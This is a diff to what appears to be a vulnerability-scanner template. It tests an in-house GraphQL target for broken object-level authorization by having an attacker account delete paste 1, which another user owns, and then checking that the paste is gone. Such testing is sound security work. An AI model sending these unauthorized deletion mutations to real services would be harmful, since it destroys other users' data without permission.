@@ -3,9 +3,12 @@
 # This template tests for BOLA vulnerabilities in the in-house GraphQL target's deletePaste
 # mutation using a three-phase approach that verifies mutation persistence:
 #
-# Phase 1 (setup): Read paste ID 2 as victim to confirm it exists
-# Phase 2 (attack): Attacker attempts unauthorized deletePaste mutation
-# Phase 3 (verify): Re-read paste ID 2 to confirm resource was deleted (returns null)
+# Phase 1 (setup): Read paste ID 1 as victim (user1) to confirm it exists
+# Phase 2 (attack): Attacker (user2) attempts unauthorized deletePaste mutation on victim's paste
+# Phase 3 (verify): Re-read paste ID 1 to confirm resource was deleted (returns null)
+#
+# Paste 1 is owned by user1 (victim); user2 (attacker) deleting it proves cross-user BOLA.
+# Uses paste 1 (delete) — distinct from template 02 which uses paste 3 (edit).
 #
 # Success criteria: All three phases return 200 AND verify phase shows data.paste is null
 
@@ -34,10 +37,10 @@ role_selector:
   victim_permission_level: "higher"
 
 graphql:
-  # Phase 1: Setup - verify resource exists as victim
+  # Phase 1: Setup - victim (user1) reads their own paste to confirm it exists
   - query: |
       query GetPaste {
-        paste(id: 2) {
+        paste(id: 1) {
           id
           title
           content
@@ -51,10 +54,10 @@ graphql:
       - type: status
         status: [200]
 
-  # Phase 2: Attack - attacker performs unauthorized deletion
+  # Phase 2: Attack - attacker (user2) performs unauthorized deletion of victim's paste
   - query: |
       mutation DeletePaste {
-        deletePaste(id: 2) {
+        deletePaste(id: 1) {
           result
         }
       }
@@ -66,10 +69,10 @@ graphql:
         words: ["result"]
         part: body
 
-  # Phase 3: Verify - resource was deleted (returns null)
+  # Phase 3: Verify - resource was deleted (returns null); proves cross-user BOLA
   - query: |
       query VerifyPasteDeleted {
-        paste(id: 2) {
+        paste(id: 1) {
           id
           title
           content
@@ -90,6 +93,7 @@ detection:
       value: null
   vulnerability_pattern: "vulnerable_graphql_bola_paste_deletion_verified"
   resource_deleted: true
+  # Cross-user BOLA: attacker (user2, ownerId=3) deleted paste owned by victim (user1, ownerId=2)
   conditions:
     - attack_phase_status: [200]
       verify_phase_status: [200]
